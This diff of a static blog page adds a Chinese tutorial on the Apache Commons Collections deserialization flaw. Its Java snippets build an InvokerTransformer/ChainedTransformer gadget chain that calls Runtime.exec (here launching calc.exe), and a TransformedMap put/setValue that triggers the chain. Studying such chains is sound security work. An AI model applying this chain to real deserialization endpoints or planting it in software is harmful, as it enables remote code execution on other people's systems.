@@ -22,7 +22,7 @@
     <meta name="description" content="A Network Security Amateur">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>refection · keac&#39;s Blog</title>
+    <title>Apache Commons Collections反序列化漏洞 · keac&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -238,7 +238,7 @@
                 <a href="/" >keac&#39;s Bolg.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">refection</a>
+                <a href="#" class="post-name">Apache Commons Collections反序列化漏洞</a>
             </div>
     </div>
     
@@ -268,7 +268,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            refection
+            Apache Commons Collections反序列化漏洞
             <!-- 404 -->
             
         </h1>
@@ -287,12 +287,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">0</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2022/05/23</span>
+                    <span class="post-intro-time">2022/05/25</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -416,15 +416,54 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection（集合）</code>相关类对象。</p>
+<h1 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h1><p>该接口的重要实现类有：<code>ConstantTransformer</code>、<code>invokerTransformer</code>、<code>ChainedTransformer</code>、<code>TransformedMap</code></p>
+<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p><code>ConstantTransformer</code>类是<code>Transformer</code>接口其中的一个实现类，<code>ConstantTransformer</code>类重写了<code>transformer</code>方法</p>
+<p><code>ConstantTransformer</code>，常量转换，转换的逻辑也非常的简单：传入对象不会经过任何改变直接返回。例如传入<code>Runtime.class</code>进行转换返回的依旧是<code>Runtime.class</code>。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Object obj = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">        ConstantTransformer transformer = <span class="keyword">new</span> ConstantTransformer(obj);</span><br><span class="line">        System.out.println(transformer.transform(obj));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>在<code>Collections</code>组件中提供了一个非常重要的类: <code>org.apache.commons.collections.functors.InvokerTransformer</code>，这个类实现了<code>java.io.Serializable</code>接口。2015年有研究者发现利用<code>InvokerTransformer</code>类的<code>transform</code>方法可以实现Java反序列化<code>RCE</code>，并提供了利用方法：<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java" target="_blank" rel="noopener">CommonsCollections1.java</a>。</p>
+<p><code>InvokerTransformer</code>类<code>transform</code>方法实现了类方法动态调用，即采用反射机制动态调用类方法（反射方法名、参数值均可控）并返回该方法执行结果。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//代码片段</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line"><span class="comment">//调用的方法名</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line"><span class="comment">//反射的参数类型数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line"><span class="comment">//反射的参数数组</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//org.apache.commons.collections.functors #57</span></span><br><span class="line"><span class="comment">// 获取输入类的类对象</span></span><br><span class="line">Class cls = input.getClass();</span><br><span class="line"><span class="comment">// 通过输入的方法名和方法参数，获取指定的反射方法对象</span></span><br><span class="line">Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line"><span class="comment">// 反射调用指定的方法并返回方法调用结果</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure>
+
+<p>使用<strong><code>InvokerTransformer</code>实现调用本地命令执行</strong></p>
+<p>在pom.xml添加依赖</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 定义需要执行的本地系统命令</span></span><br><span class="line">        String cmd = <span class="string">"calc.exe"</span>;</span><br><span class="line">        <span class="comment">// 构建transformer对象</span></span><br><span class="line">        InvokerTransformer transformer1 = new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;);</span><br><span class="line">        <span class="comment">// 传入Runtime实例，执行对象转换操作</span></span><br><span class="line">        transformer1.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在真实的漏洞场景中我们是没有办法直接在调用<code>transformer.transform</code>的时候直接传入<code>Runtime.getRuntime()</code>对象的，所以我们需要通过<code>ChainedTransformer</code>来创建攻击链</p>
+<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p><code>org.apache.commons.collections.functors.ChainedTransformer</code>类封装了<code>Transformer</code>的链式调用，我们只需要传入一个<code>Transformer</code>数组，<code>ChainedTransformer</code>就会依次调用每一个<code>Transformer</code>的<code>transform</code>方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>调用过程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// new ConstantTransformer(Runtime.class</span></span><br><span class="line">      Class&lt;?&gt; runtimeClass = Runtime<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// new InvokerTransformer("getMethod", new Class[]&#123;</span></span><br><span class="line">      <span class="comment">//         String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;</span></span><br><span class="line">      <span class="comment">// ),</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">//反射出 getRuntime方法</span></span><br><span class="line">      Class  cls1       = runtimeClass.getClass();</span><br><span class="line">      Method getMethod  = cls1.getMethod("getMethod", new Class[]&#123;String.class, Class[].class&#125;);</span><br><span class="line">      Method getRuntime = (Method) getMethod.invoke(runtimeClass, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// new InvokerTransformer("invoke", new Class[]&#123;</span></span><br><span class="line">      <span class="comment">//         Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;</span></span><br><span class="line">      <span class="comment">// )</span></span><br><span class="line">      <span class="comment">// 反射出 getRuntime object的 invoke方法</span></span><br><span class="line">      Class   cls2         = getRuntime.getClass();</span><br><span class="line">      Method  invokeMethod = cls2.getMethod("invoke", new Class[]&#123;Object.class, Object[].class&#125;);</span><br><span class="line">      Runtime runtime      = (Runtime) invokeMethod.invoke(getRuntime, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)</span></span><br><span class="line">      <span class="comment">// getRuntime invoke 之后反射exec 方法</span></span><br><span class="line">      Class  cls3       = runtime.getClass();</span><br><span class="line">      Method execMethod = cls3.getMethod(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">      execMethod.invoke(runtime, cmd);</span><br></pre></td></tr></table></figure>
+
+<p>通过构建<code>ChainedTransformer</code>调用链，最终间接的使用<code>InvokerTransformer</code>完成了反射调用<code>Runtime.getRuntime().exec(cmd)</code>的逻辑。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;</span><br><span class="line">                ),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;cmd&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链对象</span></span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 执行对象转换操作</span></span><br><span class="line">        Object transform = transformedChain.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(transform);</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用InvokerTransformer"><a href="#利用InvokerTransformer" class="headerlink" title="利用InvokerTransformer"></a>利用<code>InvokerTransformer</code></h2><p><code>org.apache.commons.collections.map.TransformedMap</code>类间接的实现了<code>java.util.Map</code>接口，同时支持对<code>Map</code>的<code>key</code>或者<code>value</code>进行<code>Transformer</code>转换，调用<code>decorate</code>和<code>decorateTransform</code>方法就可以创建一个<code>TransformedMap</code>:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">        key = <span class="keyword">this</span>.transformKey(key);</span><br><span class="line">        value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> Object <span class="title">transformKey</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.keyTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>只要调用<code>TransformedMap</code>的<code>setValue/put/putAll</code>中的任意方法都会调用<code>InvokerTransformer</code>类的<code>transform</code>方法，从而也就会触发命令执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Map map=<span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"a"</span>,<span class="string">"a"</span>);</span><br><span class="line">        <span class="comment">// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformedChain);</span><br><span class="line">        transformedMap.put(<span class="string">"ccc"</span>, <span class="string">"ccc"</span>);<span class="comment">// 执行put 触发transform</span></span><br><span class="line">        <span class="comment">// 遍历Map元素，并调用setValue方法</span></span><br><span class="line">        <span class="keyword">for</span> (Object obj : transformedMap.entrySet()) &#123;</span><br><span class="line">            Map.Entry entry = (Map.Entry) obj;</span><br><span class="line">            <span class="comment">// setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链</span></span><br><span class="line">            entry.setValue(<span class="string">"test"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>
+
+<p>只要在Java的API中的任何一个类只要符合以下条件，我们就可以在Java反序列化的时候触发<code>InvokerTransformer</code>类的<code>transform</code>方法实现<code>RCE</code>：</p>
+<ol>
+<li>实现了<code>java.io.Serializable</code>接口；</li>
+<li>并且可以传入我们构建的<code>TransformedMap</code>对象；</li>
+<li>调用了<code>TransformedMap</code>中的<code>setValue/put/putAll</code>中的任意方法一个方法的类；</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://javasec.org/javase/JavaDeserialization/Collections.html" target="_blank" rel="noopener">https://javasec.org/javase/JavaDeserialization/Collections.html</a></p>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://www.loongten.com">keacwu</a>
-            <p>原文链接：<a href="http://www.loongten.com/2022/05/23/refection/">http://www.loongten.com/2022/05/23/refection/</a>
-            <p>发表日期：<a href="http://www.loongten.com/2022/05/23/refection/">May 23rd 2022, 4:43:37 pm</a>
-            <p>更新日期：<a href="http://www.loongten.com/2022/05/23/refection/">May 23rd 2022, 4:43:37 pm</a>
+            <p>原文链接：<a href="http://www.loongten.com/2022/05/25/java-commons-collections/">http://www.loongten.com/2022/05/25/java-commons-collections/</a>
+            <p>发表日期：<a href="http://www.loongten.com/2022/05/25/java-commons-collections/">May 25th 2022, 2:39:35 pm</a>
+            <p>更新日期：<a href="http://www.loongten.com/2022/05/25/java-commons-collections/">May 25th 2022, 9:56:51 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -432,17 +471,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href= "/2022/05/23/java-reflection/" title= "Java 反射机制">
-                    <div class="nextTitle">Java 反射机制</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2020/08/09/idea-jetbrains-agent-latest/" title= "idea-jetbrains-agent-latest">
-                    <div class="prevTitle">idea-jetbrains-agent-latest</div>
+                <a href= "/2022/05/25/java-deserialization/" title= "Java反序列化">
+                    <div class="prevTitle">Java反序列化</div>
                 </a>
             
         </li>
@@ -458,7 +492,7 @@ height:50vh;
 <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
 <script>
     var gitalk = new Gitalk({
-        id: "refection", // 可选。默认为 location.href
+        id: "Apache Commons Collections反序列化漏洞", // 可选。默认为 location.href
         owner: 'keac',
         repo: 'keac',
         clientID: '4eb4b81722e704969d15',
@@ -469,7 +503,7 @@ height:50vh;
     gitalk.render('container')
 
     // var gitment = new Gitment({
-    //     // id: "refection", // 可选。默认为 location.href
+    //     // id: "Apache Commons Collections反序列化漏洞", // 可选。默认为 location.href
     //     owner: 'keac',
     //     repo: 'keac',
     //     oauth: {
@@ -594,7 +628,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Transformer"><span class="toc-number">2.</span> <span class="toc-text">Transformer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ConstantTransformer"><span class="toc-number">2.1.</span> <span class="toc-text">ConstantTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#InvokerTransformer"><span class="toc-number">2.2.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ChainedTransformer"><span class="toc-number">2.3.</span> <span class="toc-text">ChainedTransformer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用InvokerTransformer"><span class="toc-number">2.4.</span> <span class="toc-text">利用InvokerTransformer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1703,9 +1737,68 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 74
+        Total : 77
         </div>
         <!-- search  -->
         
@@ -1721,17 +1814,32 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2022/05/25/java-commons-collections/" >Apache Commons Collections反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2022/05/25/java-deserialization/" >Java反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span><a class="archive-post-title" href= "/2022/05/24/java-sun-misc-Unsafe/" >Java Unsafe</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/24</span><a class="archive-post-title" href= "/2022/05/24/java-dynamic-proxy/" >Java动态代理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">05/23</span><a class="archive-post-title" href= "/2022/05/23/java-ClassLoader/" >Java ClassLoader</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">05/23</span><a class="archive-post-title" href= "/2022/05/23/java-reflection/" >Java 反射机制</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/23</span><a class="archive-post-title" href= "/2022/05/23/refection/" >refection</a>
         </li>
     
     
